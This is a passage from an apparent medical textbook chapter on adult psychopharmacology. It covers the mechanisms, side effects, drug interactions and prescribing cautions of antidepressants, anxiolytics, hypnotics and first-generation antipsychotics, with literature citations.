In clinical practice, even after an appropriate diagnosis is made for an individual patient and the decision is made to use a medication from a particular pharmacotherapeutic class (e.g., an antidepressant for depression), multiple variables need to be considered prior to selecting a specific agent.  The physician should take the following into account: (1) patient acuity and the need to address the most dangerous presenting symptoms (e.g., behavioral agitation, suicidality, catatonia, etc.) first, (2) the patient’s past treatment history, (3) pre-existing medical conditions in order to minimize any increase in medical risk, (4) possible medication interactions, (5) the time required for amelioration of symptoms, (6) a medication’s known side effect profile and how this may affect presenting symptoms, (7) the need to minimize the use of polytherapy, (8) possible pharmacogenetic factors and hereditary patterns of drug response and tolerance, and (9) financial cost-benefit considerations.  The practicing physician should consider these issues prior to initiating treatment.(Ansari, Osser et al. 2009)
	
Characteristics of the major classes of psychotropics and their use in adults are discussed below.  Children and adolescents may tolerate or respond to these medications differently.  The use of psychopharmacological therapies in these age groups is outside the scope of this chapter.

== Antidepressants ==
	
Currently available antidepressants primarily affect the norepinephrine and serotonin (monoamine) neurotransmitter systems.(Nestler, Hyman et al. 2009)  Norepinephrine systems originate primarily from the locus ceruleus (and lateral tegmental areas) and project widely to almost all areas of the brain and spinal cord.  Serotonergic neurons reside in the raphe nuclei in the brainstem and diffusely make contact with all areas of the brain.  Most antidepressants increase the available amount of norepinephrine and/or serotonin at the neuronal synapse by decreasing the reuptake of these neurotransmitters into the pre-synaptic cell. They do this by inhibiting the norepinephrine transporter and/or the serotonin transporter, or by decreasing the metabolism of these neurotransmitters.  Other antidepressants have direct effects on monoamine receptors.  Genetic polymorphisms of the norepinephrine and serotonin reuptake transporters (Kim, Lim et al. 2006) as well as polymorphisms of post-synaptic serotonin receptors(McMahon, Buervenich et al. 2006) have been associated with differences in responses to different antidepressants.  Once synaptic changes have taken place with treatment, long-term adaptations in post-synaptic neurons and resultant changes in gene expression may then be responsible for alleviating depression.(Nestler, Hyman et al. 2009)

===Tricyclic Antidepressants (TCAs)===
	
Beginning with the introduction of imipramine in the late 1950’s,(Kuhn, 1958) tricyclic antidepressants were among the first classes of antidepressants developed.  They share a tricyclic structure (two benzene rings on either side of a seven-member ring), exhibit variable degrees of norepinephrine and serotonin reuptake inhibition, and are antagonists at several other neurotransmitter receptors.(Hyman, Arana et al. 1995)  Examples of commonly used TCAs include the tertiary amines imipramine, amitriptyline, clomipramine, and doxepin, and the secondary amines desipramine (metabolite of imipramine) and nortriptyline (metabolite of amitriptyline).  All TCAs can cause the following adverse effects: (1) slowing of intra-cardiac conduction as measured by QRS and QTc prolongation, (2) anticholinergic effects such as dry mouth, urinary retention, and constipation due to muscarinic acetylcholine receptor antagonism, (3) orthostatic hypotension due to peripheral alpha-1-adrenergic antagonism, and (4) sedation and possible weight gain due to histamine (H1) receptor antagonism.  For these reasons TCAs need to be started at low doses and increased gradually, giving the patient time to accommodate to these effects.  Individual differences in both severity of side effects and therapeutic effects (along with differences in therapeutic serum levels)(Perry, Zeilmann et al. 1994) do exist among individual TCAs.  There is some evidence to suggest that TCAs may have a particularly important role in the treatment of severe and psychotic depression.(Hamoda and Osser, 2008)
	
The cardiac effects of TCAs have contributed to a reduction in their use over the past 20 years.  Prolonged QT interval (measured as QTc when corrected for heart rate) may be associated with torsades de pointes, a potentially fatal ventricular arrhythmia (also see section on antipsychotics).  All patients should have an ECG to rule out any existing conduction abnormalities prior to considering TCAs.  Patients with recent myocardial infarctions should not initiate treatment with these antidepressants.  Most importantly, depressed patients who are at risk for suicide and overdose may not be appropriate for treatment with TCAs.  It should be noted that a 1-2 week supply of these medications can be fatal in overdose due to the risk of cardiac arrhythmias.  Therefore, depending on the patient’s risk of suicide, clinicians may need to limit the number of tablets prescribed with each refill.  This concern is significantly lessened with the use of newer antidepressants that are safer in overdose.
	
TCAs are often used for their mild to moderate analgesic effects in the treatment of chronic pain syndromes.(Magni, 1991)  These effects are independent of any effect on mood, with efficacy starting at lower doses, and with response seen earlier than when antidepressants are used for depression.(Magni, 1991; Max, Culnane et al. 1987; Onghena and Van Houdenhove, 1992)  The TCAs seem more effective for chronic pain than the selective serotonin reuptake inhibitor antidepressants (SSRIs, see below).(Ansari, 2000; Fishbain, 2000; Saarto and Wiffen, 2007)

===Monoamine Oxidase Inhibitors (MAOIs)===
	
Monoamine oxidase is an enzyme that acts to metabolize monoamines, both intracellularly and extracellularly.  Its inhibition increases the amount of serotonin, norepinephrine and dopamine available for neurotransmission.  The first MAOI, iproniazide, an anti-tuberculosis drug, was discovered in the 1950’s.  Tranylcypromine, phenelzine, isocarboxazid, and more recently transdermal selegiline are MAOIs currently available in the United States for the treatment of depression.  These antidepressants may be particularly effective for patients with atypical depression (i.e., depression characterized by hyperphagia and hypersomnia).(Quitkin, Stewart et al. 1993)
	
Although serotonergic side effects—see SSRIs below—as well as orthostatic hypotension can occur with MAOIs, there are two other primary areas of concern that limit the use of these agents.(Lippman and Nash, 1990)  First, dangerous interactions can occur with certain foods, such as aged cheeses and wines that contain biogenic amines such as tyramine.  MAOIs can inhibit the metabolism of tyramine in the intestine, increasing its general circulation and ultimately leading to an increase in sympathetic outflow and an adrenergic (&quot;hypertensive&quot;) crisis characterized by severe hypertension, headache, and increased risk of stroke and cerebral hemorrhage.  Patients need to be advised regarding dietary restrictions before treatment.  Also, to prevent hypertensive crisis, MAOIs cannot be combined with medications that have sympathomimetic properties such as some over the counter cold preparations, amphetamines, and epinephrine (which is often added to local anesthetics as a vasoconstrictor).
	
Secondly, MAOIs if used concomitantly with serotonergic agents, such as SSRIs, may lead to &quot;serotonin syndrome,&quot; a potentially fatal condition that is characterized by hyperreflexia, hyperthermia, and tachycardia, and may lead to delirium, seizures, coma and death.(Sternbach, 1991)  A two week washout period is required when switching from SSRIs (or any other agents with serotonergic effects) to MAOIs, or vice versa.  An exception is when the long half-life SSRI fluoxetine is being discontinued: a five week washout period is needed before starting an MAOI.(Boyer and Shannon, 2005)  The treating physician should access appropriate online databases such as the drug-specific DRUG-REAX® System (www.micromedex.com/products/drugreax) or GeneMedRx (www.genemedrx.com) to rule out dangerous drug-drug interactions when considering the use of an MAOI.

===Selective Serotonin Reuptake Inhibitors (SSRIs)===
	
SSRIs are antidepressants with a more favorable side effect profile than TCAs and MAOIs and as such are used as first-line antidepressants.  As their name implies, SSRIs inhibit the serotonin transporter from reuptaking serotonin at the neuronal synapse.  Interestingly, polymorphisms at the promoter region of the serotonin transporter gene (SLC6A4) may influence response to SSRIs:  the presence of the &quot;short&quot; form of the serotonin transporter gene may be associated with poor response to SSRIs, whereas the presence of the &quot;long&quot; allele may be associated with positive drug response (Malhotra, Murphy et al. 2004) and better tolerability.(Murphy, Hollander et al. 2004)  Recent data from the large NIMH STAR*D study, however, have failed to support the association between this polymorphism and drug response.(Kraft, Peters et al. 2007; Lekman, Paddock et al. 2008)
	
Currently available SSRIs include fluoxetine, paroxetine, sertraline, fluvoxamine, citalopram and its S-enantiomer escitalopram.  Possible mild early side effects (that can be minimized by starting the SSRI at a low dose and increasing the dose gradually) include gastro-intestinal upset, sweating, headaches, jitteriness or sedation.  Continuation of these agents may be associated with reversible sexual side effects (i.e., delayed ejaculation, decreased libido, or erectile dysfunction) in 2-73% of treated patients (depending on how questions regarding sexual side effects are asked).(Montejo, Llorca et al. 2001)
	
SSRIs differ in their propensities to inhibit hepatic cytochrome P450 enzymes (e.g., CYP1A2, CYP2C9, CYP2C19, CYP2D6, CYP3A4).(Ereshefsky, Jhee et al. 2005)  Inhibition of hepatic enzymes may lead to decreased metabolism of substrate medications such as warfarin, metoprolol, tricyclic antidepressants, and antipsychotics.  This may increase serum levels of these drugs and lead to increased risk of dangerous adverse effects such as bleeding, hypotension, cardiac arrhythmias, and parkinsonian effects, respectively.  Among the SSRIs, citalopram and escitalopram are the least likely to inhibit the metabolism of other drugs and are therefore preferred in patients concomitantly treated with multiple other medications.  Escitalopram is a more recently marketed, and still expensive, successor to generic citalopram, though it has no clinically significant efficacy advantage.
	
The relatively benign side effect profiles of SSRIs and their ease of use have contributed to widespread use by clinicians who might not have been comfortable with using earlier antidepressants such as TCAs and MAOIs.  In cases of atypical presentations of depression, or depression in the context of recent substance abuse, SSRIs are more readily used even before there is absolute clarity in diagnosis. Under these circumstances, many clinicians believe that the benefits of treatment may outweigh the risks.  In the case of depressed patients with concomitant substance abuse, the possibility that some patients may not be able to maintain sobriety because of an underlying major depressive disorder has served as a rationale for beginning antidepressant therapy even when the patient is still actively using.
	
Although this empirical &quot;trial&quot; of an SSRI (as an antidepressant with a relatively benign side effect profile), in situations where there is less than optimum diagnostic clarity, may be appropriate for some patients, the physician should be aware of at least two major areas of risk.  First, all antidepressants can induce mania in the short-term, and overall mood instability in the long-term, in patients with a vulnerability to bipolar disorder.  A clear family history should be obtained to investigate whether there is a genetic predisposition to bipolar disorder.  Also, clinicians should be aware that younger depressed patients, who may go on later to exhibit manic symptoms, may be incorrectly diagnosed with unipolar depression when in fact they may have a bipolar diathesis.  A pre-bipolar presentation of depression (O'Donovan, Garnham et al. 2008) should be suspected in patients with (1) a family history of bipolar depression, (2) a younger age of onset, (3) a family history of completed suicide, (4) past poor response to antidepressants, (5) a history of treatment-emergent agitation, irritability, or suicidality, and (6) a history of post-partum psychosis.(Chaudron and Pies 2003)  Depressed patients with these characteristics may have bipolar rather than unipolar depression and therefore should not be reflexively started on an antidepressant.(Ghaemi, Ko et al. 2002; O'Donovan, Garnham et al. 2008; Phelps, 2008)
	
Secondly, antidepressants have been associated with an increased risk of treatment-emergent suicidality—this occurs in about 4% of treated patients versus 2% on placebo—especially in children, adolescents and young adults as noted in the current package inserts of all antidepressants.  It is still unclear if this risk is significant in adults over age 25.  The reasons for this increase in suicidality are not clear, although increased agitation (e.g., akathisia) or activation as a side effect,(Harada, Sakamoto et al. 2008) or the possible emergence of &quot;mixed&quot; manic symptoms (mania combined with dysphoric mood) in depressed bipolar patients as noted above, may be responsible.  Despite the concern that antidepressants may infrequently increase suicide risk, it should be noted that overall rates of suicide in the United States had actually decreased over a prior 15 year span probably due to the increasingly widespread use of SSRI antidepressants.(Grunebaum, Ellis et al. 2004)  Nevertheless, the concern about treatment-emergent suicidality argues for the need for careful evaluation and diagnosis, increased discussion of risks and benefits of treatment with patients (and family when appropriate), and close monitoring of all patients beginning antidepressant therapy.  Prescribing antidepressants when indicated, coupled with these steps, is more appropriate than withholding antidepressants in unipolar depressed patients who are more likely to benefit rather than come to harm from these treatments.(Bridge, Iyengar et al. 2007)  Unfortunately, recent surveys have found that instead of the increase that was hoped for in the monitoring of patients undergoing antidepressant therapy,(Morrato, Libby et al. 2008) there has been an overall decrease in the use of antidepressants and a recent increase in the overall rates of suicide(Gibbons, Brown et al. 2007) since the &quot;black box&quot; warnings about treatment-emergent suicidality were issued.

===Serotonin-Norepinephrine Reuptake Inhibitors (SNRIs)===
	
The SNRIs, venlafaxine, desvenlafaxine and duloxetine, are dual action serotonergic and noradrenergic antidepressants that would be expected to have efficacy similar to TCAs though without anticholinergic, antihistaminic, hypotensive, or cardiac side effects.  Venlafaxine is primarily serotonergic at lower doses and has a dual action only at higher doses.(Feighner 1999; Richelson 2003)  Using venlafaxine at lower doses (i.e., less than 150 mg per day), therefore, should not be presumed to be any different from using an SSRI.  At higher doses it can have a mild to moderate hypertensive effect,(Johnson, Whyte et al. 2006; Mbaya, Alam et al. 2007) although patients with effectively treated hypertension can tolerate venlafaxine without an increase in blood pressure(Feighner, 1995).  Duloxetine, which exerts a dual action effect throughout its dose range (i.e., not only at higher doses as with venlafaxine),(Stahl and Grady, 2003) can also increase blood pressure, although the effect may be less pronounced and clinically insignificant.(Raskin, Goldstein et al. 2003; Wohlreich, Mallinckrodt et al. 2007)  SNRIs, like TCAs, are more likely to induce mania in bipolar patients than SSRIs.(Leverich, Altshuler et al. 2006)
	
Because low-dose TCAs have been shown to be modestly effective in the treatment of chronic pain syndromes, and SNRIs have a similar dual action, they have been proposed for the treatment of chronic pain symptoms as well.  Duloxetine is currently the only antidepressant with an FDA indication for diabetic neuropathy and fibromyalgia. Although the more benign side effect profile of duloxetine may make it the preferred agent in a patient for whom the risks associated with a TCA are unacceptable, there is no evidence to suggest it would be more efficacious for the treatment of pain than the more cost-effective TCAs.

===Antidepressants with Other Mechanisms===
	
Bupropion is an antidepressant with a poorly understood mechanism of action.  It is believed to exert its effect through dopamine reuptake inhibition although it is unclear why this mechanism alone should provide it with an antidepressant effect.  Some data suggest that it may also exhibit norepinephrine reuptake inhibition.(Richelson, 2003; Rosenbaum, Arana et al. 2005)  Bupropion has a different side effect profile than antidepressants that significantly affect the serotonergic systems.  It is unlikely to cause sexual side effects or weight gain—two of the most common reasons for medication non-adherence in patients.  However, bupropion can lower seizure threshold and is therefore contraindicated in patients who are seizure-prone (e.g., patients with a history of seizures or conditions that increase seizure risk, such as eating disorders, or active withdrawal from alcohol or benzodiazepines).  The risk of seizure is dose dependent: this should be kept in mind when combining bupropion with CYP2D6 inhibitors such as paroxetine or fluoxetine that may increase bupropion serum levels.  Among antidepressants, bupropion is least likely to cause mania in bipolar patients.(Leverich, Altshuler et al. 2006; Post, Altshuler et al. 2006)
	
Mirtazapine increases both serotonin and norepinephrine at the neuronal synapse (and therefore like SNRIs has &quot;dual actions&quot;) through mechanisms distinct from reuptake inhibition.  It is an antagonist at alpha-2-adrenergic autoreceptors thereby increasing norepinephrine and serotonin release, and it blocks post-synaptic 5HT-2A, 5HT-2C, and 5HT-3 serotonin receptors.(Feighner, 1999) (Mianserin, an earlier analog of mirtazapine marketed in Europe, has a similar mechanism of action).  Mirtazapine can improve appetite (likely through 5HT-3 and H1 antagonism) and sleep (through H1 antagonism).  As expected, these immediate effects can be very beneficial in the treatment of the acutely depressed patient with poor oral intake and insomnia.  Weight gain however can be a concern over the long run.
	
Nefazodone is a post-synaptic 5HT2 antagonist with weak serotonin and norepinephrine reuptake inhibition.(DeVane, Grothe et al. 2002)  Although nefazodone can improve sleep, and is neutral in regard to weight gain and less likely than SSRIs to cause sexual side effects, it is used much less often since it was found to produce rare (1 in 250,000 to 300,000 patient-years), but severe, hepatotoxicity.(Gelenberg, 2002)  Trazodone, a structurally similar antidepressant, is used primarily as a hypnotic (it proved to be too sedating for most patients at doses necessary for antidepressant effect).  Trazodone can commonly cause orthostasis and should be used cautiously in the elderly.  Priapism is a rare side effect that should be discussed with male patients before treatment.

===Further Notes on the Clinical Use of Antidepressants===
	
Clinical practice today emphasizes the use of newer (&quot;second generation&quot;) antidepressants including bupropion, citalopram, duloxetine, escitalopram, fluoxetine, fluvoxamine, mirtazapine, nefazodone, paroxetine, sertraline, trazodone and venlafaxine.  As discussed above, the older tricyclics and MAOIs are not first-line because of their greater toxicity and risk of harm from overdose.  In a meta-analysis of 203 studies comparing the efficacy and side effects of these newer antidepressants, no substantial differences in effectiveness were found.(Gartlehner, Gaynes et al. 2008)  The authors recommended that antidepressants be selected on the basis of differences in expected side effects and cost (i.e., – use generic products over brand items).  Another review of 117 trials concluded that sertraline had the most favorable balance among benefits, side effects, and acquisition cost.(Cipriani, Furukawa et al. 2009)
	
The STAR*D study (Sequenced Treatment Alternatives to Relieve Depression), sponsored by the NIMH was a study of medications for the treatment of major depression.  It produced important insights into the optimum use of pharmacotherapy for this disorder.  STAR*D started with almost 4,000 heterogeneous &quot;real world&quot; depressed patients, who were treated by &quot;real world&quot; clinicians such as primary care doctors.  Patients agreed to have up to 4 medication trials with the goal of achieving remission from their depression.  Each trial lasted up to 14 weeks.  Patients started with citalopram for the first trial.  If response was unsatisfactory, they could have a switch to one of three antidepressants, or an augmentation with one of two augmenting agents.  For the third trial, there were other switches or augmentations available, and finally for those still depressed and still willing to undergo the fourth trial, there was the choice of an MAOI or a combination of venlafaxine and mirtazapine.  The latter has been referred to informally as &quot;rocket fuel&quot; because of the four different neurotransmitter alterations that this combination is thought to induce.(McGrath, Stewart et al. 2006)  Key findings from STAR*D include the following:
* Citalopram did not work well if patients met the DSM-IV criteria for melancholic features.(McGrath, Khan et al. 2008)

* The switches in the second trial (to another SSRI: sertraline, to bupropion, or to venlafaxine) had equal efficacy.

* The augmentations in the second trial (buspirone--discussed in anxiolytic section below--or bupropion) worked equally well.

* Nothing worked well in trials one or two if patients had significant anxiety symptoms along with their depression.(Fava, Rush et al. 2008)  However, a recent study with adjunctive aripiprazole (an antipsychotic discussed below) added to an SSRI found good results in patients with depression mixed with anxiety, in a post-hoc analysis.(Trivedi, Thase et al. 2008)  This needs replication in a prospectively designed study.

* In the third trial, switching to a tricyclic antidepressant worked fairly well.  It might have worked better if clinicians had dosed it properly and used plasma levels to monitor adequacy of dosage.

* Adding lithium (discussed in the mood stabilizer section below) did not work as well as adding triiodothyronine in the third trial, but lithium might have done better if clinicians had dosed it properly.

* In trial 4, the MAOI did not do well compared to the venlafaxine/mirtazapine combination, but clinicians underdosed the MAOI.  Unfortunately, for the few patients who improved from either treatment, early relapse was common.
	
As a group, STAR*D subjects were not particularly interested in psychotherapeutic treatment for their depression.  Psychotherapy was available as an option in the second treatment trial, but patients could elect to drop it from the option list and most did so.(Wisniewski, Fava et al. 2007)  The modest remission rates seen in STAR*D may reflect that a major component of the improvement in depression seen in research and clinical settings comes from the non-specific, interpersonal supportive aspects of care including the therapeutic alliance.  STAR*D patients might have been less susceptible to these benefits than other patients who are more invested in psychosocial treatments of their disorder.  It is hoped that future studies will improve our ability to select the best treatments for each patient, psychopharmacological and psychotherapeutic, depending on their needs and preferences.

== Anxiolytics ==

The pharmacological treatment of anxiety symptoms is both simple and complicated.  On the one hand, medications such as benzodiazepines and barbiturates can have a relatively immediate effect on distressing anxiety symptoms.  On the other hand, the use of such medications carries the risk of cognitive impairment, physical dependence, as well as the risk of psychological dependence and inappropriate use in some patients.
	
It is not clear that episodic anxiety that is associated with situational stressors should be treated with medications.  Anxiety per se may be a normal response to distressing events and a signal that may enhance a person’s motivation to address these real-life events.  As such, it may be better understood and addressed through psychotherapy rather than pharmacologically.  Medical students and physicians should be aware of cultural (and managed care) pressures that push for &quot;popping a pill&quot; rather than addressing the underlying causes of the patient's anxiety and improving coping strategies.
	
Anxiety disorders are characterized by persisting patterns of anxiety symptoms impairing functioning.  Examples include panic disorder, social anxiety disorder, post-traumatic stress disorder, obsessive-compulsive disorder and generalized anxiety disorder.  The first-line medication treatments for most anxiety disorders are SSRIs (or other antidepressants with serotonergic effects—see Table 1).  A time period of several weeks may be necessary before clear response.  During this time, anxiolytics with more immediate effects (e.g., benzodiazepines) may be used for early symptom control.

===Benzodiazepines===
	
Benzodiazepines were first developed in the 1960s and are now the most commonly used anxiolytics used in the United States.  Diazepam, clonazepam, chlordiazepoxide, temazepam, oxazepam, lorazepam, and alprazolam are examples of benzodiazepines.  Their mechanism of action is through their binding on ?-aminobutyric acid (GABA) receptors.(Nutt and Malizia 2001)  GABA is the primary inhibitory neurotransmitter in the brain.   Benzodiazepines bind to one type of GABA receptor (GABAA) thereby increasing the receptor’s affinity for GABA.  Increased GABA effect then increases the frequency of chloride channel openings allowing this ion’s influx into the cell which in turn decreases normal cell firing.  The benzodiazepine binding site is composed of multiple subunits; binding to the alpha-1 subunit may explain sedative effects of benzodiazepines whereas alpha-2 subunit binding may be needed for anxiolytics effects.(Nestler, Hyman et al. 2009)
	
Benzodiazepines are associated with multiple adverse effects.  They are sedating, can impair concentration, memory,(Buffett-Jerrott and Stewart, 2002) coordination, can lead to falls in the elderly(Wagner, Zhang et al. 2004) (especially at initiation of treatment and after dose increases), and can cause respiratory depression.  The choice of which benzodiazepine to use is often based on the pharmacokinetics of each drug.  Diazepam, chlordiazepoxide, and clonazepam have relatively long half-lives.  Additionally, diazepam and chlordiazepoxide are significantly hepatically metabolized and have multiple active metabolites; the use of these medications in hepatically compromised patients is therefore problematic.  In medically ill patients, and in the elderly, benzodiazepines with short half-lives, such as lorazepam and oxazepam, are preferred, especially when the risk of respiratory depression is a concern (e.g., patients with chronic obstructive pulmonary disease).  Alprazolam has a shorter half-life than lorazepam and oxazepam.  It is, however, also associated with significant rebound anxiety because of the rapid drop from peak serum level after each dose.  Despite its current widespread use, alprazolam should generally be avoided in patients who may require frequent or daily administration of an anxiolytic drug.
	
Perhaps the greatest drawback of benzodiazepines, however, is that they can lead to abuse and/or dependence.  Physical dependence is characterized by increased tolerance to these drugs and the development of significant withdrawal symptoms upon discontinuation; this occurs with long term and/or high dose use of benzodiazepines and is not necessarily a sign of misuse or addiction (although patients should be made aware of the need for very gradual taper of these medications if used long term).  Addiction, on the other hand, which may include elements of physical dependence, is characterized by maladaptive behavioral changes leading to medication misuse.  Benzodiazepines (along with barbiturates discussed below) are controlled substances which should be prescribed judiciously and cautiously and only when adequate follow-up is available to ensure appropriate use.  It should be noted that adequate follow-up is not often feasible in primary care settings.  Benzodiazepines should generally be avoided in any patient with a history of substance or alcohol abuse: most benzodiazepine abuse or dependence occurs in these individuals.  Admittedly, there are circumstances in which a patient with a history of substance abuse may require benzodiazepines (e.g., a patient with a severe debilitating panic disorder who has been refractory to all other non-benzodiazepine medications)—these circumstances, however, should be considered infrequent.

===Barbiturates===
	
Developed in the 1940’s and 50’s, barbiturates are now rarely used for the treatment of anxiety due to a higher risk of dependence and dangerousness in overdose when compared to benzodiazepines.  Whereas benzodiazepine binding increases the receptor’s affinity for GABA and indirectly affects chloride channels, barbiturates (and alcohol), binding on a different site on GABAA receptors, can increase chloride influx into neurons even when GABA is not present.  Chloral hydrate, a weak barbiturate, is still occasionally used in certain settings for the treatment of refractory insomnia or for sedation prior to anxiety provoking medical studies (e.g., MRI).  Other barbiturates such as phenobarbital, pentobarbital, and butalbital, are still commonly used in other areas of medicine for treatment of conditions (e.g., seizure disorder, pain) other than anxiety disorders.

===Medicines without Abuse Potential Used for the Treatment of Anxiety===
	
Buspirone is a partial 5HT1A agonist (primarily on autoreceptors) causing decreased serotonin release from serotonergic neurons.  It is not clear why this action would help decrease anxiety; any effect is presumed to be due to &quot;downstream&quot; adaptations over several weeks.  Buspirone has no effect on GABA receptors and as such cannot immediately replace benzodiazepines.  It has no immediate anxiolytic effects.  However, it has no potential for abuse, and does not impair cognition or motor coordination.  Side effects, however, may include headache, insomnia, jitteriness and nausea.  It is indicated for the treatment of Generalized Anxiety Disorder.
	
Propranolol is a beta-adrenergic antagonist.  Although it is primarily used medically for its effect on heart rate and blood pressure, its &quot;off-label&quot; use in psychiatry is based on its ability to reduce overall sympathetic activation.  It is particularly helpful in circumstances where a sympathetic reaction to an anxiety-provoking stimulus can occur, such as in instances of performance anxiety.  Musicians, for example, may take a dose one hour prior to their appearance on stage.  Propranolol can decrease somatic manifestations of anxiety such as tremulousness and tachycardia.  It does not, however, help alleviate symptoms associated with generalized social phobia or generalized anxiety disorder.  Propranolol should be avoided if the patient has congestive heart failure or significant asthma.  Despite earlier concerns that beta-blockers may cause depression (Waal, 1967) this is not supported by more recent studies.(Ko, Hebert et al. 2002)
	
Clonidine, initially developed as an antihypertensive, is an alpha-2-adrenergic autoreceptor agonist which serves to decrease sympathetic drive in the locus ceruleus.  It can decrease hyperarousal in patients with post-traumatic stress disorder (Boehnlein and Kinzie, 2007) and other conditions associated with autonomic hyperactivity (e.g., rebound hyperactivity in opioid withdrawal states).
	
Prazosin is an alpha-1-adrenergic receptor antagonist.  Like clonidine, it is an antihypertensive which can decrease anxiety symptoms associated with post- traumatic states.  It has no sedative properties but it can help decrease PTSD symptoms during the day and decrease associated sleep disturbances and nightmares at night.(Miller, 2008; Raskind, Peskind et al. 2007; Taylor, Lowe et al. 2006; Taylor, Martin et al. 2008)
	
Hydroxyzine is an antihistamine with less affinity for muscarinic and alpha-1-adrenergic receptors than other antihistamines.  Because it does not cause dependence and has no abuse potential, it is useful for treating anxiety symptoms in patients with a history of substance abuse.  Also, it has been shown to have efficacy in the treatment of generalized anxiety disorder.(Llorca, Spadone et al. 2002; Lader and Scotto, 1998; Ferreri, and Hantouche et al. 1994)

===Newer Hypnotics===
	
Zolpidem, zaleplon, and eszopiclone (enantiomer of zopiclone which is available in Europe) are newly developed non-benzodiazepine hypnotics that bind to alpha-1 subunits on the benzodiazepine binding site on GABA receptors.(Sanger, 2004)  These &quot;z-drugs&quot; cause sedation but lack anxiolytic effects despite some cross-reactivity with benzodiazepines.  Although their abuse potential is purportedly less than benzodiazepines, they are not free from the risk of dependence and withdrawal symptoms upon discontinuation.(Cubala and Landowski, 2007; Liappas, Malitas et al. 2003; Sethi and Khandelwal, 2005; Victorri-Vigneau, Dailly et al. 2007)  There is insufficient evidence that these hypnotics are either safer or more effective than benzodiazepines, yet, due to physician misconceptions, they have been widely used when more cost-effective treatments should be considered.(Siriwardena, Qureshi et al. 2006; Glass, Lanctot et al. 2005)  Zolpidem is now generic, but zaleplon and eszopiclone are still brand products and are expensive.  Ramelteon is a new hypnotic that is a melatonin receptor agonist which may have modest efficacy in shortening sleep latency.(Sateia, Kirby-Long et al. 2008; Roth, Seiden et al. 2006)  It is well-tolerated (Johnson, Suess et al. 2006) but again there are no studies to suggest it should be favored over more cost-effective alternatives.  When considering treatment of chronic insomnia, physicians should not overlook the benefits that may be derived from nonpharmacological, e.g., behavioral, therapies.(Sivertsen, Omvik et al. 2006)
	
Table 2 summarizes the characteristics of selected non-antidepressant medications for the treatment of anxiety and insomnia.(WHO 2007; PDR 2008; Hyman, Arana et al. 1995; Rosenbaum, Arana et al. 2005; Stahl, 2005; Taylor, Paton et al. 2007)  Antidepressants used in the treatment of anxiety disorders are listed in Table 1.

== Antipsychotics ==

===First Generation Antipsychotics (FGAs)===
	
The first antipsychotic, chlorpromazine, was developed in the 1950s.(Meyer and Simpson 1997)  Subsequently other antipsychotics were developed that share similarities in their mechanisms of action and in their side effect profiles.  Chlorpromazine, thioridazine, perphenazine, molindone, thiothixene, pimozide, fluphenazine, and haloperidol are examples of these medications which are now characterized as &quot;first generation antipsychotics&quot; (FGAs).   Alternative names for this class of medications include: &quot;neuroleptics&quot; (for their propensity to cause adverse neurological effects), &quot;major tranquilizers&quot; (as opposed to the later designated &quot;minor tranquilizers&quot; such as benzodiazepines and barbiturates), &quot;typical&quot; antipsychotics, and &quot;conventional&quot; antipsychotics.
	
All first generation antipsychotics are believed to exert their antipsychotic effects through post-synaptic D2 dopamine receptor antagonism, thereby reducing the effect of endogenous dopamine released by presynaptic dopaminergic neurons.(Nestler, Hyman et al. 2009)  Dopaminergic neurons originate from 3 distinct nuclei.  One group of dopaminergic neurons projects from the ventral tegmental area of the midbrain to the nucleus accumbens, cingulate cortex and prefrontal cortex (the mesolimbic and mesocortical tracks); these affect emotions and cognition and as such are the targets for the therapeutic effects of antipsychotic drugs.  Dopaminergic neurons also arise from the substantia nigra and project to the striatum (the nigrostriatal track); these are implicated in the neurological side effects of antipsychotics.  And finally, hypothalamic dopaminergic neurons project to the pituitary gland and serve to regulate the release of prolactin (the tuberoinfundibular track); disruption of this system with D2 blockade can result in hyperprolactinemia associated with the use of antipsychotics.  Overall, in terms of clinical use, it has been shown that the optimal D2 receptor occupancy level for maximizing antipsychotic effect while minimizing adverse effects is 60-70%.(Farde, Nordstrom et al. 1992)
	
FGAs have traditionally been divided into low potency (e.g., chlorpromazine, thioridazine), mid-potency (e.g., perphenazine, molindone, thiothixene), and high potency (e.g., haloperidol, fluphenazine) antipsychotics, based on the number of milligrams of each drug needed to show comparable efficacy.  For example, chlorpromazine 300 mg (low potency) may have the same therapeutic effect as perphenazine 24 mg (mid-potency) and haloperidol 6 mg (high potency).  FGAs are often listed as a spectrum from low to high potency.  The low potency antipsychotics usually exhibit TCA-like side effects such as anticholinergic, antihistaminic, and orthostatic effects (see section on antidepressants) but have a lower risk of causing acute neurological side effects such as acute muscle dystonias.  At the other end of the spectrum, high potency FGAs have lower risks of TCA-like adverse effects but a much higher risk of causing acute dystonias.  Mid-potency antipsychotics share all these side effects but less so than those of either pole.  Physicians should become familiar with using at least one antipsychotic from each potency class in order to be able to match the side effect profile to the patient's pre-existing vulnerabilities.
	
When dosing FGAs, it is important to consider that although in most efficacy studies the presumed therapeutic dose of haloperidol is 10 mg/day, the ideal dose may be much lower: haloperidol 2 mg/day in neuroleptic-naïve patients, and 4 mg in non-neuroleptic-naïve patients may be sufficient to produce a &quot;neuroleptic threshold&quot;—the dose at which cogwheel rigidity, a sign of sufficient D2 receptor blockade, first appears.(McEvoy, Stiller et al. 1986)
	
The propensity of FGAs to cause neurological symptoms such as acute muscle dystonias, parkinsonism, akathisia, and tardive dyskinesia significantly limits their use in current practice.  Acute dystonias, which are more likely to occur if the patient is young, male, has a history of substance abuse and/or a prior history of dystonias, is primarily seen in patients taking FGAs although it can also occur in patients with any antipsychotic with significant D2 receptor antagonism (see risperidone below).  Use of anticholinergic medications, such as benztropine or diphenhydramine (or promethazine used outside the U.S.) can decrease the occurrence of early dystonias.  Parkinsonism, characterized by bradykinesia, tremor, rigidity, and masked facies, can develop after 1-4 weeks of treatment with FGAs.  Anticholinergic medications or a dopamine releasing agent such as amantadine may be helpful, although changing the antipsychotic may be required.  Akathisia, which is an unpleasant subjective sense of inner restlessness relieved by movement, is also commonly seen in patients treated with FGAs.  Identifying akathisia as a cause of agitation (or even worsening psychosis or suicidality) is important because treatment would include decreasing, rather than increasing, antipsychotic dose.  Tardive dyskinesia (TD), a potentially irreversible syndrome of abnormal involuntary movements, can develop with extended use of antipsychotics, especially if high doses are used for long periods of time.  Patients with prolonged antipsychotic treatment, a history of affective disorders, a history of parkinsonian side effects with initial antipsychotic treatment, as well as women and the elderly, are at a higher risk for developing TD.  Once tardive dyskinesia has developed, withdrawal of the antipsychotic (especially if this is precipitous) may unmask worsened abnormal movements.  Resumption of antipsychotic treatment may suppress these symptoms for a period of time, but progression of the underlying movement disorder may continue.  Despite trials of multiple remedies, treatments for TD are generally only partially effective.(Soares-Weiser and Fernandez 2007)
	
